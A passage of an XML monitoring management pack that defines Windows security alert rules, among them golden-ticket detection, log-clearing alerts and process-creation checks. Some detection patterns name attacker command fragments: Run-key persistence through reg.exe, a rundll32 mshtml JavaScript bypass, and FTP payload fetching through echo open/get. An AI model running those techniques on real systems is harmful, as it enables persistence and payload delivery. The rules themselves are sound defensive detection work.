                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4624</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">9</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[10]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">seclogo</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Negotiate</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.CredentialSwap.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Administrator</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4732</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4733</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.ProhibitedApp" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">8003</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>AppLocker</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.ProhibitedApp.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.SmartCardDisabled" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[24]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>%%2060</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[24]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>'Smartcard Required' - Disabled</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4738</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.SmartCardDisabled.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Accounts.LocalAdminChange" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.LocalAccountChange.DS">
            <SID1>Replace this with SID of Account set by GPO</SID1>
            <SID2>Replace this with SID of Account set by GPO</SID2>
            <SID3>Replace this with SID of Account set by GPO</SID3>
            <SID4>Replace this with SID of Account set by GPO</SID4>
            <SID5>Replace this with SID of Account set by GPO</SID5>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Accounts.LocalAdminChange.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
              <SuppressionValue>$Data/Params/Param[2]$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.GoldenTicketDetection" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4769</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>0x1f</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>0x1F</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.GoldenTicketDetection.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.SystemLogCleared" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>System</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">104</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>System log</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Microsoft-Windows-Eventlog</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.SystemLogCleared.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.SystemLogCleared" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">104</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Microsoft-Windows-Eventlog</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.SystemLogCleared.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Custom</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="SecurityMonitoringMP.GPOMonitoring.Event.DS">
            <AGPMAccount>Thisisaplaceholder</AGPMAccount>
            <AGPMDomain>Thisisaplaceholder</AGPMDomain>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule.GPOChange.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/Property[@Name='gpoGUID']$</AlertParameter1>
              <AlertParameter2>$Data/Property[@Name='gpoName']$</AlertParameter2>
              <AlertParameter3>$Data/Property[@Name='gpoDomain']$</AlertParameter3>
              <AlertParameter4>$Data/Property[@Name='gpoUser']$</AlertParameter4>
              <AlertParameter5>$Data/Property[@Name='opCorrId']$</AlertParameter5>
              <AlertParameter6>$Data/Property[@Name='opCode']$</AlertParameter6>
              <AlertParameter7>$Data/Property[@Name='text']$</AlertParameter7>
              <AlertParameter8>$Data/Property[@Name='status']$</AlertParameter8>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/Property[@Name='gpoGUID']$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.4688.SuspiciousCMD" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>cmd.exe /c cd c:\Progra~1&amp;for</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>cmd.exe /c cd c:\windows\debug&amp;for</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>cmd.exe /c cd C:\windows\Installer&amp;for</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.4688.SuspiciousCMD.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.4688.SuspiciousReg" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>reg.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Add</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>\Run /v</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>bginfo</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v e2e /d c:\windows\System32\notepad.exe /f</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>\Prep\</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>C:\Program Files</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>Yahoo Messenger</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.4688.SuspiciousReg.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>\rundll32.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>javascript</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>mshtml,RunHTMLApplication</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>cmd.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>echo open</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>echo get</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
